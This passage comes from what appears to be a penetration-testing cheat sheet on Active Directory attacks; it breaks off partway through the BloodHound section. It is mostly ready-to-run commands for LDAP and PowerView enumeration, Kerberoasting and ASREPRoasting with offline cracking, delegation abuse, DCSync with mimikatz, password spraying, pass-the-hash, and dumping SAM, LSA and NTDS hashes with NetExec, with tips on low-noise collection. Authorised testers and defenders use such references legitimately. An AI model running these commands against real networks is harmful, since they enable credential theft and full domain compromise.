# Authenticated — enumerate computers
ldapsearch -x -h [ip] -D "[user]@[domain]" -w '[password]' -b "DC=[domain],DC=[tld]" "(objectClass=computer)" name

# Authenticated — dump full structure
ldapsearch -x -h [ip] -D "[user]@[domain]" -w '[password]' -b "DC=[domain],DC=[tld]"

# Filter by object class
ldapsearch -x -H ldap://[ip] -b "DC=[domain],DC=[tld]" "(objectclass=user)"
ldapsearch -x -H ldap://[ip] -b "DC=[domain],DC=[tld]" "(objectclass=group)"

# Authenticated with domain\user syntax
ldapsearch -h [ip] -x -D '[domain]\[user]' -w '[password]' -b "DC=[domain],DC=[tld]"

# Search by keyword
ldapsearch -H ldap://[ip] -x -D '[domain]\[user]' -w '[password]' -b "DC=[domain],DC=[tld]" "[term]"

# Return specific attribute
ldapsearch -H ldap://[ip] -x -D '[domain]\[user]' -w '[password]' -b "DC=[domain],DC=[tld]" "[term]" [attribute]

8.2.3 Useful Search Filters

Category Filter Notes
All users (objectClass=user)
All computers (objectClass=computer)
All groups (objectClass=group)
All OUs (objectClass=organizationalUnit)
Disabled accounts (userAccountControl:1.2.840.113556.1.4.803:=2)
Pre-auth disabled (ASREPRoast) (userAccountControl:1.2.840.113556.1.4.803:=4194304)
SPNs set (Kerberoast) (servicePrincipalName=*)
Constrained delegation (msDS-AllowedToDelegateTo=*)
LAPS password readable (ms-MCS-AdmPwd=*) Requires permission
LAPS expiry (presence check) (ms-MCS-AdmPwdExpirationTime=*) Readable by any user
Password in description (description=*password*)
Password never set (pwdLastSet=0)
Group membership (&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=[domain],DC=[tld]))
Specific user (sAMAccountName=[user])
AD CS objects (objectClass=cACertificate)
Keyword in description (description=*[keyword]*)
All objects (objectClass=*)

8.3 Domain Enumeration

8.3.1 From Linux

BloodHound via proxychains:

proxychains bloodhound-python -c ALL -u [user] -p '[password]' -d [domain] -dc [dc-hostname] -ns [dc-ip] --dns-tcp

# With machine account NTLM hash (extracted from /etc/krb5cc.keytab)
proxychains bloodhound-python -c ALL -u '[machine]$@[DOMAIN]' --hashes 00000000000000000000000000000000:[ntlm] -d [DOMAIN] -ns [dc-ip] --dns-tcp

SMB access check:

smbmap -H [ip] -u [user] -p [password]
netexec smb [ip]

WinRM access check:

netexec winrm [ip] -u [user] -p '[password]'

User enumeration:

# Impacket — requires valid Kerberos ticket in memory
proxychains python3 GetADUsers.py -all -k -no-pass -dc-ip [dc-ip] [domain]/Administrator

# rpcclient
proxychains rpcclient -U [domain]/[user]%[password] [dc-ip]

enumdomusers
queryuser 0x3601

Group enumeration (rpcclient):

proxychains rpcclient -U [domain]/[user]%[password] [dc-ip]

enumdomgroups
querygroup 0x200

ASREPRoasting:

python3 impacket/examples/GetNPUsers.py [domain]/ -no-pass -dc-ip [dc-ip] -userfile users.txt /format:hashcat

Kerberoasting — extract service tickets then crack offline:

impacket-GetUserSPNs -dc-ip [dc-ip] -outputfile tickets.txt [domain]/[user]:[password]
GetUserSPNs.py [domain]/[user]:[password] -dc-ip [dc-ip]

hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt

Overpass-the-Hash / PTK — get a TGT from NTLM hash:

python3 impacket/examples/getTGT.py [domain]/[user]:[password]

Reset AD password (rpcclient):

setuserinfo2 [user] 23 '[newpassword]'

8.3.2 From Windows

Check GPOs that grant remote access methods (PsExec, WMI, WinRM, RDP) to specific hosts and groups.

Kerberoasting:

Rubeus.exe kerberoast /user:[svc_account] /nowrap

ASREPRoasting:

Rubeus.exe asreproast /format:hashcat /user:[user] /nowrap

Internal web services — targets with "web" or "svc" in name; reach via SOCKS proxy if not directly accessible. Entry via phishing, malicious document, command execution, or DevOps pipeline.

8.3.3 Unconstrained Delegation

# Monitor for incoming TGTs
Rubeus.exe monitor /interval:1 /filtuser:[dc]$ /nowrap

# Force DC authentication via Print Spooler
SpoolSample.exe [dc-hostname] [compromised-host]

# Inject captured ticket
Rubeus.exe ptt /ticket:[base64-ticket]

# DCSync with injected ticket
mimikatz # lsadump::dcsync /domain:[domain] /user:[domain]\administrator

8.3.4 Constrained Delegation

# Get delegatable TGT from current session
Rubeus.exe tgtdeleg /nowrap

# S4U to impersonate target user over allowed SPN, add alternate services
Rubeus.exe s4u /impersonate:[admin-user] /user:[svc-account] /domain:[domain] /msdsspn:[spn] /altservice:cifs,host,http,winrm /ticket:[base64-ticket] /dc:[dc-fqdn] /ptt

8.3.5 Resource-Based Constrained Delegation (RBCD)

# Create a new machine account
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount [fake-computer] -Password $(ConvertTo-SecureString '[password]' -AsPlainText -Force)

# Grant the new machine account delegation rights on the target
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Set-ADComputer [target-computer] -PrincipalsAllowedToDelegateToAccount [fake-computer]$ -Server [dc-ip] -Verbose

# S4U to impersonate administrator
Rubeus.exe s4u /user:[fake-computer]$ /rc4:[ntlm-hash] /impersonateuser:administrator /msdsspn:CIFS/[target-fqdn] /ptt

8.4 PowerView

PowerView (from PowerSploit) and its .NET port SharpView give situational awareness in a domain. Drop the SharpView.exe prefix to run any command as a PowerView cmdlet in PowerShell.

8.4.1 Domain / Policy / DC Info

# Current/specified domain object (DCs, forest, child domains, FSMO roles)
Get-Domain
Get-Domain -Domain [domain]

# Domain controllers
Get-DomainController -Domain [domain]

# Forest, all forest domains, global catalogs
Get-Forest
Get-ForestDomain
Get-ForestGlobalCatalog

# Default domain / DC policy (password & Kerberos policy — like net accounts)
Get-DomainPolicy

# OUs, sites, subnets, domain SID
Get-DomainOU | select name
Get-DomainSID

# Convert names <-> SIDs, decode UAC values
ConvertTo-SID [user]
Convert-ADName -ObjectName S-1-5-21-...-1724
Get-DomainUser [user] | ConvertFrom-UACValue -ShowAll

8.4.2 Users & Groups

# All users / a single user, count
Get-DomainUser
(Get-DomainUser).count
Get-DomainUser -Identity [user] -Domain [domain] | select samaccountname,description,memberof,pwdlastset,lastlogontimestamp,useraccountcontrol,serviceprincipalname

# Export full user data for offline triage
Get-DomainUser * -Domain [domain] | select samaccountname,description,memberof,pwdlastset,admincount,userprincipalname,serviceprincipalname,useraccountcontrol | Export-Csv .\users.csv -NoTypeInformation

# AS-REP roastable (no Kerberos pre-auth)
Get-DomainUser -KerberosPreauthNotRequired -Properties samaccountname,useraccountcontrol,memberof

# Kerberoastable (users with an SPN)
Get-DomainUser -SPN -Properties samaccountname,memberof,serviceprincipalname

# Delegation: constrained (trusted-to-auth) and unconstrained
Get-DomainUser -TrustedToAuth -Properties samaccountname,memberof
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Passwords / creds hidden in the description field
Get-DomainUser -Properties samaccountname,description | ? {$_.description -ne $null}

# Password-set times (plan a spray); accounts not rotated in 90+ days
Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon | select samaccountname,pwdlastset | Sort-Object pwdlastset
Get-DomainUser -Properties samaccountname,pwdlastset | ? { $_.pwdlastset -lt (Get-Date).AddDays(-90) }
# Groups and members
Get-DomainGroup -Properties Name
Get-DomainGroupMember -Identity 'Domain Admins' -Recurse

# Protected groups (adminCount=1)
Get-DomainGroup -AdminCount

# Managed security groups (managedBy set — possible self-service membership = lateral move)
Get-DomainManagedSecurityGroup

# Foreign principals: users/groups from other domains in our groups (cross-trust)
Get-DomainForeignUser
Get-DomainForeignGroupMember

8.4.3 Computers & Sessions

# All computers / OS / UAC; export for offline analysis
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol
Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp,useraccountcontrol | Export-Csv .\computers.csv -NoTypeInformation

# Delegation: unconstrained / constrained computers
Get-DomainComputer -Unconstrained -Properties dnshostname,useraccountcontrol
Get-DomainComputer -TrustedToAuth -Properties dnshostname,useraccountcontrol
# Local group membership / sessions / logged-on / admin check on a host
Get-NetLocalGroup -ComputerName [host]
Get-NetLocalGroupMember -ComputerName [host]
Get-NetSession -ComputerName [host]
Get-NetLoggedon -ComputerName [host]
Test-AdminAccess -ComputerName [host]
# 'Meta' functions — hunt across the whole domain (threaded)
Find-DomainUserLocation                 # where target users are logged in
Find-DomainUserLocation -UserIdentity [user]
Find-LocalAdminAccess                   # hosts where current user is local admin
Find-DomainProcess -ProcessName lsass   # hosts running a given process

8.4.4 Shares & GPOs

# Shares on a host / reachable shares domain-wide / interesting files
Get-NetShare -ComputerName [host]
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile -Include *.config,*.txt,*pass*
# All GPOs; GPOs applied to a specific host
Get-DomainGPO | select displayname
Get-DomainGPO -ComputerIdentity [host] | select displayname

# Where a user/group is a member of a local group via GPO (Restricted Groups / GPP)
Get-DomainGPOUserLocalGroupMapping -Identity [user]
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity [host]

8.4.5 ACLs & Trusts

ACL misconfigurations chain object-to-object control; map abusable rights to their PowerView abuse cmdlet.

# ACLs on an object, with GUIDs resolved to rights/extended-rights
Get-DomainObjectAcl -Identity [user] -Domain [domain] -ResolveGUIDs

# Filter ACLs to a specific principal's SID (e.g. who has GenericWrite on a group)
$sid = ConvertTo-SID [user]
Get-DomainObjectAcl -Identity 'Security Operations' | ? { $_.SecurityIdentifier -eq $sid }

# All interesting ACLs (modify rights over non-built-in objects) — large; save offline
Find-InterestingDomainAcl -Domain [domain] -ResolveGUIDs
Right (ACE)Abuse cmdlet
ForceChangePasswordSet-DomainUserPassword
GenericAll / GenericWriteSet-DomainObject, Set-DomainUserPassword, Add-DomainGroupMember
AddMemberAdd-DomainGroupMember
WriteOwnerSet-DomainObjectOwner
WriteDACLAdd-DomainObjectAcl
AllExtendedRightsSet-DomainUserPassword / Add-DomainGroupMember
# Domain & forest trusts (cross-trust attack surface)
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping                   # recursive trust enumeration
CmdletPurpose
Get-Domain / Get-DomainControllerDomain object, DCs, FSMO roles
Get-DomainPolicyPassword & Kerberos policy
Get-DomainUser / Get-DomainGroupUsers / groups (filter by SPN, UAC, adminCount)
Get-DomainGroupMemberMembers of a group (-Recurse for nesting)
Get-DomainComputerComputers (OS, UAC, delegation)
Find-DomainUserLocationWhere users are logged in
Find-LocalAdminAccessHosts where current user is local admin
Find-DomainShareReachable domain shares
Get-DomainGPOUserLocalGroupMappingLocal-group membership via GPO
Get-DomainObjectAcl / Find-InterestingDomainAclObject ACLs / abusable ACEs
Get-DomainTrust / Get-DomainTrustMappingTrust enumeration
Invoke-KerberoastRequest & extract roastable TGS hashes

8.5 NetExec / CrackMapExec

NetExec (nxc) is the maintained fork of CrackMapExec (legacy binary cme / crackmapexec); flags are identical. Targets accept an IP, CIDR, hostname, or file. Protocols: smb winrm ldap mssql rdp ssh ftp.

8.5.1 Authentication & Spraying

# Null / anonymous and guest sessions
nxc smb [dc-ip] -u '' -p ''
nxc smb [dc-ip] -u guest -p ''

# Creds, NTLM hash (pass-the-hash), Kerberos ccache; --local-auth for local (SAM) accounts
nxc smb [ip] -u [user] -p [password]
nxc smb [ip] -u [user] -H [hash]
nxc smb [ip] -u [user] -H [hash] --local-auth      # "(Pwn3d!)" = local admin
nxc smb [ip] -u [user] -p [password] -k

# Spray: a password list keeps going past the first hit with --continue-on-success
nxc smb [ip] -u users.txt -p '[password]' --continue-on-success
# Test paired user:password lines (1st user/1st pass, ...) with --no-bruteforce
nxc winrm [ip] -u users.txt -p pass.txt --no-bruteforce --continue-on-success

8.5.2 Enumeration

# Recon: a bare SMB sweep yields OS, hostname, domain, signing, SMBv1
nxc smb [ip]/24
nxc smb [ip]/24 --gen-relay-list relay.txt     # hosts with SMB signing disabled

# Domain objects (work even from a null/unprivileged account)
nxc smb [dc-ip] -u [user] -p [password] --pass-pol
nxc smb [dc-ip] -u [user] -p [password] --users
nxc smb [dc-ip] -u [user] -p [password] --groups
nxc smb [dc-ip] -u [user] -p [password] --groups 'Administrators'    # group members
nxc smb [dc-ip] -u '' -p '' --rid-brute 10000                        # build user list via RID brute
nxc smb [ip] -u [user] -p [password] --computers
nxc smb [ip] -u [user] -p [password] --local-groups

# Shares, disks, sessions (admin usually needed for sessions/loggedon)
nxc smb [ip] -u [user] -p [password] --shares
nxc smb [ip] -u [user] -p [password] --disks
nxc smb [ip] -u [user] -p [password] --sessions
nxc smb [ip] -u [user] -p [password] --loggedon-users
nxc smb [ip] -u [user] -p [password] --loggedon-users --loggedon-users-filter [user]

# WMI query
nxc smb [ip] -u [user] -p [password] --wmi "SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'"

# Export any result (needs full path); JSON output
nxc smb [dc-ip] -u '' -p '' --pass-pol --export $(pwd)/passpol.txt

8.5.3 Protocol Modes, Roasting & BloodHound

# LDAP: AS-REP roast / Kerberoast straight to hashcat-ready files
nxc ldap [dc-ip] -u users.txt -p '' --asreproast asreproast.out      # hashcat -m 18200
nxc ldap [dc-ip] -u [user] -p [password] --kerberoasting kerb.out    # hashcat -m 13100
nxc ldap [dc-ip] -u [user] -p [password] --trusted-for-delegation --password-not-required --admin-count

# WinRM / MSSQL / RDP auth (WinRM "(Pwn3d!)" = command exec available)
nxc winrm [ip] -u [user] -p [password]
nxc mssql [ip] -u [user] -p [password] --local-auth
nxc rdp   [ip] -u [user] -p [password]

# Command exec: -x cmd / -X powershell; --exec-method smbexec|wmiexec|atexec|mmcexec
nxc smb [ip] -u [user] -p [password] -x whoami
nxc smb [ip] -u [user] -p [password] --exec-method smbexec -x whoami
nxc smb [ip] -u [user] -p [password] -X '$PSVersionTable'
nxc mssql [ip] -u [user] -p [password] -x whoami          # xp_cmdshell via DBA account

# File transfer
nxc smb [ip] -u [user] -p [password] --put-file ./local C:/Users/Public/file
nxc smb [ip] -u [user] -p [password] --get-file C:/Windows/System32/drivers/etc/hosts hosts

# BloodHound ingestion (collect directly) — also marks valid users as Owned in the DB
nxc ldap [dc-ip] -u [user] -p [password] --bloodhound --collection All --dns-server [dc-ip]

8.5.4 Modules & Credential Dumping

# List / inspect modules for a protocol
nxc ldap -L
nxc smb -M spider_plus --options

# Useful modules
nxc ldap [dc-ip] -u [user] -p [password] -M laps            # read LAPS passwords
nxc ldap [dc-ip] -u [user] -p [password] -M user-desc       # user descriptions (often creds)
nxc ldap [dc-ip] -u [user] -p [password] -M MAQ             # MachineAccountQuota
nxc ldap [dc-ip] -u [user] -p [password] -M adcs            # find ADCS enrollment services
nxc smb  [ip]    -u [user] -p [password] -M gpp_password    # decrypt cpassword in GPP
nxc smb  [ip]    -u [user] -p [password] -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
# Credential dumping (needs local admin / DCSync rights)
nxc smb [ip]    -u [user] -p [password] --sam               # local SAM hashes
nxc smb [ip]    -u [user] -p [password] --lsa               # LSA secrets, cached creds, DPAPI keys
nxc smb [dc-ip] -u [user] -p [password] --ntds              # dump NTDS.dit (DCSync)
nxc smb [dc-ip] -u [user] -p [password] --ntds --user krbtgt
nxc smb [dc-ip] -u [user] -p [password] --ntds --enabled

# DCSync as a machine account via proxychains (pivot)
proxychains4 -q nxc smb [dc-ip] -u 'DC01$' -p '' --ntds
ProtocolDefault portKey flags
smb445--shares --users --groups --pass-pol --rid-brute --sam --lsa --ntds --sessions --loggedon-users -x/-X
ldap389 / 636--asreproast --kerberoasting --bloodhound --trusted-for-delegation --admin-count -M laps/user-desc
winrm5985 / 5986-x / -X (Pwn3d! = exec)
mssql1433-x (xp_cmdshell), --local-auth, -M mssql_priv
rdp3389auth validation, screenshot
FlagPurpose
-u / -p / -HUsername / password / NTLM hash (PtH)
--local-authAuthenticate against the local SAM (not a DC)
--continue-on-successKeep spraying after the first valid hit
--no-bruteforcePair user[n] with password[n] (validate known creds)
-M / -o / -LUse module / set module option / list modules
--exportWrite results to a file (full path)

8.6 BloodHound Collection & Cypher Queries

8.6.1 Collection Methods

Pick the collector based on host context, then ingest the resulting JSON/zip into BloodHound CE.

-c method Collects
All Everything except GPOLocalGroup (touches every domain-joined host — noisy).
DCOnly LDAP-only from the DC: users, groups, trusts, ACLs, OU/GPO, object props. No host touch — stealthiest.
ComputerOnly Sessions and local groups from hosts only (opposite of DCOnly).
Session One round of session enumeration; pair with --loop to catch transient logons.

SharpHound (Windows, .NET) — default run plus stealth/DC-only variants:

# default collection (identifies own domain)
.\SharpHound.exe -c All -d [domain] --domaincontroller [dc-ip]

# DC-only, low-noise (no host connections)
